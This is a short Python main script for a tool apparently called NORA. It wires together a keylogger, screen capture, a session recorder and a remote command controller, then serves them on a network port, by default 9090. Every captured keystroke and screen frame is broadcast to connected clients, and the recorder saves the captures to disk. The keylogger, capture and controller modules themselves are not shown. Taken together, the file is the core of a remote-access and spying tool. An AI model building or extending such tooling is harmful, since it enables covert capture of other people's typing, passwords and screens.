import threading
import os

import server
import keylogger as kl
import screencap as sc
import controller
import recorder as rec

PORT = int(os.environ.get("NORA_PORT", 9090))

_key_lock = threading.Lock()


def on_key(char):
    server.broadcast_key(char)


def on_frame(b64):
    server.broadcast_frame(b64)


def main():
    recorder = rec.Recorder(output_dir="recordings", fps=10)
    server.init(controller.handle_command, recorder)

    keylogger = kl.Keylogger(on_key)
    keylogger.start()

    capture = sc.ScreenCapture(on_frame, fps=12, quality=55, scale=0.6)
    capture.attach_recorder(recorder)
    capture.start()

    server.run(port=PORT)


if __name__ == "__main__":
    main()
